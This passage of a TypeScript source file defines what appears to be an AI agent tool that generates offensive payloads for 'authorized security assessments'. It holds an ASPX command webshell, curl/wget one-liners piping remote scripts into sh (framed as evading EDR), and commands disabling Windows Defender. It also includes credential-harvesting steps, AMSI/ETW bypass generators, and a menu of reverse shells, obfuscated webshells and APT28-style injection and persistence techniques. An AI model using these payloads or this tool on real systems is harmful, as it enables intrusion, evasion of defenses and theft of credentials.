    out.push('  System.Diagnostics.Process.Start("cmd.exe",new string[]{"/c",Request["c"]}).Id).StandardOutput).ReadToEnd()); %>')
    out.push('```')
  }

  return out.join('\n')
}

// ── Privilege escalation enumeration — LinPEAS / WinPEAS ────────────────────

function privescEnum(target: string, platform: string): string {
  const out: string[] = ['[TechniqueGenerator] Privilege Escalation Enumeration', '═'.repeat(60), '']
  out.push(`Target: ${target}  Platform: ${platform}`)
  out.push('')

  if (platform === 'linux' || platform === 'all') {
    out.push('## LinPEAS (Linux local enumeration)')
    out.push('')
    out.push('### 1. Transfer to target (one-liner)')
    out.push('```bash')
    out.push('# Python HTTP serve from your box, then on target:')
    out.push('curl -L http://YOUR_IP/linpeas.sh | sh | tee /tmp/linpeas.log')
    out.push('# or wget:')
    out.push('wget -O - http://YOUR_IP/linpeas.sh | sh')
    out.push('```')
    out.push('')
    out.push('### 2. LinPEAS in-memory (no disk write — defeats EDR file scan)')
    out.push('```bash')
    out.push('curl -L http://YOUR_IP/linpeas.sh | bash 2>&1 | tee /dev/shm/.cache.log')
    out.push('# /dev/shm is tmpfs, no disk write')
    out.push('```')
    out.push('')
    out.push('### 3. Direct download from GitHub (no need to host locally)')
    out.push('```bash')
    out.push('curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh')
    out.push('```')
    out.push('')
    out.push('### 4. Quick automated checks (no script needed)')
    out.push('```bash')
    out.push('# SUID binaries')
    out.push('find / -perm -4000 -type f 2>/dev/null')
    out.push('# Sudo permissions')
    out.push('sudo -l 2>/dev/null')
    out.push('# Writable /etc/passwd or /etc/shadow')
    out.push('ls -la /etc/passwd /etc/shadow')
    out.push('# Cron jobs')
    out.push('ls -la /etc/cron* /var/spool/cron/ 2>/dev/null; cat /etc/crontab')
    out.push('# World-writable directories')
    out.push('find / -type d -perm -o+w 2>/dev/null | head -20')
    out.push('# Kernel version (CVE lookup)')
    out.push('uname -a; cat /etc/os-release')
    out.push('# Capabilities')
    out.push('getcap -r / 2>/dev/null')
    out.push('# Docker socket')
    out.push('ls -la /var/run/docker.sock')
    out.push('# NFS no_root_squash')
    out.push('cat /etc/exports; showmount -e localhost')
    out.push('# PATH hijack writable dirs')
    out.push('echo $PATH; for d in $(echo $PATH | tr ":" " "); do [ -w "$d" ] && echo "WRITABLE: $d"; done')
    out.push('```')
    out.push('')
    out.push('### 5. Interpret LinPEAS output (red/yellow highlights = privesc vectors)')
    out.push('- 99% SUID/SGID binaries listed — focus on unusual ones (nmap, vim, find, python, perl)')
    out.push('- "Listening on" section: services on 127.0.0.1 only — can be relayed to internal')
    out.push('- "Files with capabilities" — cap_setuid=ep on python3.8 = instant root')
    out.push('- "Root process" — services running as root that can be exploited')
    out.push('- SSH keys (id_rsa) in /home/*/.ssh or /root/.ssh — try other users')
  }

  if (platform === 'windows' || platform === 'all') {
    out.push('')
    out.push('## WinPEAS (Windows local enumeration)')
    out.push('')
    out.push('### 1. Transfer to target')
    out.push('```powershell')
    out.push('Invoke-WebRequest -Uri http://YOUR_IP/winPEASx64.exe -OutFile C:\\Windows\\Temp\\wp.exe')
    out.push('C:\\Windows\\Temp\\wp.exe')
    out.push('```')
    out.push('')
    out.push('### 2. AMSI-aware transfer (bypass Defender first)')
    out.push('```powershell')
    out.push('# AMSI bypass first, then:')
    out.push("(New-Object Net.WebClient).DownloadFile('http://YOUR_IP/winPEASx64.exe', 'C:\\Windows\\Temp\\wp.exe')")
    out.push('Start-Process C:\\Windows\\Temp\\wp.exe -ArgumentList ' + '"' + 'quiet' + '"')
    out.push('```')
    out.push('')
    out.push('### 3. Quick automated checks (PowerShell one-liners)')
    out.push('```powershell')
    out.push('# Current user / privileges')
    out.push('whoami /all; whoami /groups')
    out.push('# Stored credentials')
    out.push('cmdkey /list')
    out.push('mimikatz.exe  # or pypykatz, SharpDPAPI')
    out.push('# Services with weak permissions')
    out.push('accesschk.exe -uwcv "Everyone" * /c')
    out.push('accesschk.exe -uwcv "BUILTIN\\Users" * /c')
    out.push('# Unquoted service paths')
    out.push('wmic service get name,pathname,startmode | findstr /i /v "C:\\Windows\\\\" | findstr /i /v """')
    out.push('# AlwaysInstallElevated')
    out.push('reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated')
    out.push('reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated')
    out.push('# Scheduled tasks')
    out.push('schtasks /query /fo LIST /v')
    out.push('# AutoLogon credentials')
    out.push('reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" 2>nul | findstr /i "DefaultUserName DefaultPassword"')
    out.push('# Installed software (KB lookup)')
    out.push('wmic product get name,version')
    out.push('wmic qfe list')
    out.push('# Network (lateral targets)')
    out.push('arp -a; netstat -ano; ipconfig /all')
    out.push('# Shares')
    out.push('net view \\\\localhost; net share')
    out.push('```')
    out.push('')
    out.push('### 4. Interpret WinPEAS output')
    out.push('- Red "Modifiable Services" — service whose binPath you can replace = instant SYSTEM')
    out.push('- Red "AutoLogon credentials" — cleartext admin password in registry')
    out.push('- Red "DLL Hijacking" — service loads DLL from writable dir')
    out.push('- Red "AlwaysInstallElevated" — msi files run as SYSTEM regardless of user')
    out.push('- Yellow "Interesting files" — config files with creds, SSH keys, SAM/SYSTEM backup')
  }

  return out.join('\n')
}

// ── Tool implementation ────────────────────────────────────────────────────

interface TechniqueGeneratorInput {
  technique:
    | 'amsi_bypass' | 'etw_bypass' | 'shellcode_encode' | 'waf_evasion' | 'obfuscated_ps'
    | 'havoc_strategy' | 'sliver_strategy' | 'refresh_pe' | 'sgn_encoding'
    | 'traffic_encoder' | 'pe_donor' | 'dotnet_dual' | 'go_template'
    | 'apt28_strategy' | 'apt28_string_obf' | 'apt28_rotating_xor' | 'apt28_png_stego'
    | 'apt28_memory_transition' | 'apt28_apc_inject' | 'apt28_com_hijack'
    | 'apt28_dead_drop' | 'apt28_webdav_unc'
    | 'reverse_shell' | 'web_shell' | 'privesc_enum'
    | 'custom'
  payload: string
  platform?: 'windows' | 'linux'
  analysis_context?: { waf?: string; edr?: string; sandbox?: boolean }
  encoding?: 'base64' | 'hex' | 'xor'
}

export class TechniqueGeneratorTool implements Tool {
  name = 'TechniqueGenerator'

  definition: ToolDefinition = {
    type: 'function',
    function: {
      name: 'TechniqueGenerator',
      description: `Generate evasion-aware payload variants for authorized security assessments.

## Techniques
- amsi_bypass: PowerShell AMSI bypass — 10+ working variants (reflection patch / Matt Graeber / Rasta-Mouse / COM hijack / NGEN / etc.)
- etw_bypass: ETW logging bypass (reflection patch / registry)
- shellcode_encode: Shellcode encoding (XOR / rolling XOR / UUID / IPv4 / Base64 / AES-CBC + ready-to-run loaders)
- waf_evasion: Per-WAF real bypass payloads (Cloudflare / CloudFront / F5 BIG-IP / FortiWeb / NetScaler / ModSecurity + SQLi/XSS/LFI variants)
- obfuscated_ps: PowerShell obfuscation (string concat / char array / base64 / gzip+base64 / whitespace / AMSI combined)
- reverse_shell: Multi-language reverse shell generator (bash / python / perl / PHP / powershell / nc / socat / java / ruby / go / rust / awk — with base64/hex encoding variants)
- web_shell: PHP / JSP / ASPX webshells at 5 obfuscation levels (eval / base64 / gzdeflate / variable func / XOR key)
- privesc_enum: LinPEAS / WinPEAS auto-deploy + manual quick-checks + output interpretation guide
- havoc_strategy: Return Havoc-derived evasion strategy principles
- sliver_strategy: Return Sliver-derived evasion strategy principles (RefreshPE, SGN, traffic encoding, etc.)
- refresh_pe: DLL unhooking by reloading .text section from disk (Sliver approach)
- sgn_encoding: Shikata-Ga-Nai polymorphic shellcode encoding
- traffic_encoder: HTTP traffic encoder polymorphism
- pe_donor: PE metadata spoofing from legitimate binaries
- dotnet_dual: Dual-mode .NET execution guidance (in-process CLR vs fork-and-run)
- go_template: Go template conditional compilation principles
- apt28_strategy: Return APT28 (Operation Neusploit) derived evasion strategy principles
- apt28_string_obf: Alternating byte XOR + null padding string obfuscation (SimpleLoader)
- apt28_rotating_xor: 76-byte rotating XOR key payload decryption
- apt28_png_stego: PNG steganography shellcode extraction (IDAT LSB)
- apt28_memory_transition: RW→RX page transition avoiding RWX detection
- apt28_apc_inject: APC injection via QueueUserAPC (stealthier than CreateRemoteThread)
- apt28_com_hijack: COM hijacking persistence via InprocServer32
- apt28_dead_drop: Dead Drop Resolver — cloud API as C2 channel
- apt28_webdav_unc: WebDAV UNC path DLL loading without disk landing
- custom: Custom bypass technique`,
      parameters: {
        type: 'object',
        properties: {
          technique: {
            type: 'string',
            enum: ['amsi_bypass', 'etw_bypass', 'shellcode_encode', 'waf_evasion', 'obfuscated_ps', 'havoc_strategy', 'sliver_strategy', 'refresh_pe', 'sgn_encoding', 'traffic_encoder', 'pe_donor', 'dotnet_dual', 'go_template', 'apt28_strategy', 'apt28_string_obf', 'apt28_rotating_xor', 'apt28_png_stego', 'apt28_memory_transition', 'apt28_apc_inject', 'apt28_com_hijack', 'apt28_dead_drop', 'apt28_webdav_unc', 'reverse_shell', 'web_shell', 'privesc_enum', 'custom'],
            description: 'Evasion technique type',
          },
          payload: { type: 'string', description: 'Original payload/command/shellcode' },
          platform: { type: 'string', enum: ['windows', 'linux'], description: 'Target platform' },
          analysis_context: {
            type: 'object',
            properties: {
              waf: { type: 'string', description: 'Detected WAF type' },
              edr: { type: 'string', description: 'Detected EDR type' },
              sandbox: { type: 'boolean', description: 'Whether in sandbox environment' },
            },
            description: 'EnvAnalyzer detection results',
          },
          encoding: { type: 'string', enum: ['base64', 'hex', 'xor', 'xor_dynamic', 'uuid', 'ipv4', 'aes'], description: 'Encoding method (xor, xor_dynamic, uuid, ipv4, base64, aes — valid for shellcode_encode; also for reverse_shell encoding variants)' },
        },
        required: ['technique', 'payload'],
      },
    },
  }

  async execute(input: Record<string, unknown>, context: ToolContext): Promise<ToolResult> {
    const { technique, payload, platform = 'windows', analysis_context, encoding = 'xor' } = input as unknown as TechniqueGeneratorInput

    let output = ''

    switch (technique) {
      case 'amsi_bypass':
        output = this.generateAMSI(payload, analysis_context?.edr)
        break
      case 'etw_bypass':
        output = this.generateETW(payload, analysis_context?.edr)
        break
      case 'shellcode_encode':
        output = shellcodeEncode(payload, encoding)
        break
      case 'waf_evasion':
        output = wafEvasion(payload, analysis_context?.waf)
        break
      case 'obfuscated_ps':
        output = obfuscatedPS(payload)
        break
      case 'havoc_strategy':
        output = [
          havocOperationalPattern(),
          '',
          havocEvasionCompilerFlags(),
          '',
          indirectSyscallStrategy(),
          '',
          hardwareBypassStrategy(),
          '',
          sleepObfuscationStrategy(),
          '',
          stackSpoofingStrategy(),
          '',
          hashApiResolution(),
        ].join('\n')
        break
      case 'sliver_strategy':
        output = [
          sliverOperationalPattern(),
          '',
          refreshPE(),
          '',
          sgnEncoding(),
          '',
          trafficEncoderPattern(),
          '',
          peDonorSpoofing(),
          '',
          dualModeDotNet(),
          '',
          goTemplateCompilation(),
        ].join('\n')
        break
      case 'refresh_pe':
        output = refreshPE()
        break
      case 'sgn_encoding':
        output = sgnEncoding()
        break
      case 'traffic_encoder':
        output = trafficEncoderPattern()
        break
      case 'pe_donor':
        output = peDonorSpoofing()
        break
      case 'dotnet_dual':
        output = dualModeDotNet()
        break
      case 'go_template':
        output = goTemplateCompilation()
        break
      case 'apt28_strategy':
        output = [
          apt28OperationalPattern(),
          '',
          apt28StringObfuscation(),
          '',
          apt28RotatingXOR(),
          '',
          apt28PNGSteganography(),
          '',
          apt28MemoryPermissionTransition(),
          '',
          apt28APCInjection(),
          '',
          apt28COMHijacking(),
          '',
          apt28DeadDropResolver(),
          '',
          apt28WebDAVUNC(),
        ].join('\n')
        break
      case 'apt28_string_obf':
        output = apt28StringObfuscation()
        break
      case 'apt28_rotating_xor':
        output = apt28RotatingXOR()
        break
      case 'apt28_png_stego':
        output = apt28PNGSteganography()
        break
      case 'apt28_memory_transition':
        output = apt28MemoryPermissionTransition()
        break
      case 'apt28_apc_inject':
        output = apt28APCInjection()
        break
      case 'apt28_com_hijack':
        output = apt28COMHijacking()
        break
      case 'apt28_dead_drop':
        output = apt28DeadDropResolver()
        break
      case 'apt28_webdav_unc':
        output = apt28WebDAVUNC()
        break
      case 'reverse_shell': {
        // payload format: "host:port" e.g. "10.0.0.1:4444" — or use analysis_context
        const conn = (analysis_context as { reverse_target?: string } | undefined)?.reverse_target
          ?? payload
          ?? '10.0.0.1:4444'
        const [host, portStr] = String(conn).split(':')
        const port = parseInt(portStr ?? '4444', 10) || 4444
        // Default: 'all' so the agent sees every language variant. Specific platform narrows.
        const lang = String(platform === 'windows' ? 'powershell' : 'all')
        const enc = encoding ?? 'all'
        output = reverseShell(host, port, lang, enc)
        break
      }
      case 'web_shell': {
        const wsp = String(platform ?? 'php')
        const obf = String((analysis_context as { obfuscation?: string } | undefined)?.obfuscation ?? 'all')
        output = webShell(wsp, obf)
        break
      }
      case 'privesc_enum': {
        const tgt = String(payload ?? 'localhost')
        const pf = String(platform ?? 'linux')
        output = privescEnum(tgt, pf)
        break
      }
      case 'custom':
        output = `[TechniqueGenerator] Custom Bypass Technique\n\nOriginal payload: ${payload}\nPlatform: ${platform}\n\nPlease specify a concrete bypass technique (amsi_bypass/etw_bypass/waf_evasion/shellcode_encode/obfuscated_ps/havoc_strategy/sliver_strategy/apt28_strategy)`
        break
      default:
        return { content: `Unknown technique: ${technique}`, isError: true }
    }

    return { content: output, isError: false }
  }

  private generateAMSI(payload: string, edrType?: string): string {
    const lines: string[] = ['[TechniqueGenerator] AMSI Bypass Payloads', '═'.repeat(50), '']

    // Havoc principle header
    lines.push('### Havoc Principle')
    lines.push('Havoc uses hardware breakpoints (Dr0-Dr3 + VEH) instead of memory patching.')
    lines.push('Memory patching is detectable because EDRs hook NtProtectVirtualMemory.')
    lines.push('Hardware breakpoints are CPU registers — no memory modification at all.')
    lines.push('')
    lines.push('For PowerShell (where hardware breakpoints are not directly accessible),')
    lines.push('use reflection-based bypass as the most practical alternative.')
    lines.push('')

    if (edrType?.includes('CrowdStrike')) {
      lines.push(`## CrowdStrike Falcon Environment`)
      lines.push(`CrowdStrike monitors PowerShell execution closely. Recommended approach:`)
      lines.push('')
      lines.push('# Method 1: Reflection patch (recommended for PS)')
      lines.push(AMSI_BYPASS_TEMPLATES.string_obfuscation)
      lines.push('')
      lines.push('# Method 2: Execute AMSI bypass first, then payload')
      lines.push(AMSI_BYPASS_TEMPLATES.reflection_patch)
      lines.push(`# Then execute original payload:`)
      lines.push(payload)
    } else if (edrType?.includes('Defender')) {
      lines.push(`## Windows Defender Environment`)
      lines.push('')
      lines.push('# Method 1: Add exclusion path (requires admin)')
      lines.push(`  Add-MpPreference -ExclusionPath "C:\\temp"`)
      lines.push('')
      lines.push('# Method 2: Disable real-time monitoring (requires admin)')
      lines.push(`  Set-MpPreference -DisableRealtimeMonitoring $true`)
      lines.push('')
      lines.push('# Method 3: Reflection patch (no admin needed, recommended)')
      lines.push(AMSI_BYPASS_TEMPLATES.reflection_patch)
      lines.push('')
      lines.push('# Method 4: String obfuscation (bypasses static detection)')
      lines.push(AMSI_BYPASS_TEMPLATES.string_obfuscation)
      lines.push('')
      lines.push('# Then execute original payload:')
      lines.push(payload)
    } else {
      // Generic AMSI bypass
      lines.push(`## Generic AMSI Bypass (${edrType || 'unknown EDR'})`)
      lines.push('')

      let idx = 1
      for (const [name, template] of Object.entries(AMSI_BYPASS_TEMPLATES)) {
        lines.push(`### Method ${idx}: ${name}`)
        lines.push(template)
        lines.push('')
        idx++
      }

      lines.push('## Usage')
      lines.push('1. Execute AMSI bypass first (choose one method)')
      lines.push('2. Then execute original payload')
      lines.push('')
      lines.push(`Original payload: ${payload}`)
    }

    return lines.join('NEWLINE')
  }

  private generateETW(payload: string, edrType?: string): string {
    const lines: string[] = ['[TechniqueGenerator] ETW Bypass Payloads', '═'.repeat(50), '']

    // Havoc principle header
    lines.push('### Havoc Principle')
    lines.push('ETW (Event Tracing for Windows) logs PowerShell execution for EDR monitoring.')
    lines.push('Havoc disables ETW via reflection on the PSEtwLogProvider internal fields.')
    lines.push('The alternative — registry method — requires admin but is more persistent.')
    lines.push('')

    lines.push(`## ETW Bypass (${edrType || 'unknown EDR'})`)
    lines.push('ETW is used by EDRs to monitor PowerShell execution. Bypassing ETW')
    lines.push('prevents execution logging. Combine with AMSI bypass for full coverage.')
    lines.push('')

    let idx = 1
    for (const [name, template] of Object.entries(ETW_BYPASS_TEMPLATES)) {
      lines.push(`### Method ${idx}: ${name}`)
      lines.push(template)
      lines.push('')
      idx++
    }

    lines.push('## Usage')
    lines.push('1. Execute ETW bypass first')
    lines.push('2. Then execute original payload (recommend AMSI bypass too)')
    lines.push('')
    lines.push(`Original payload: ${payload}`)

    return lines.join('NEWLINE')
  }
}
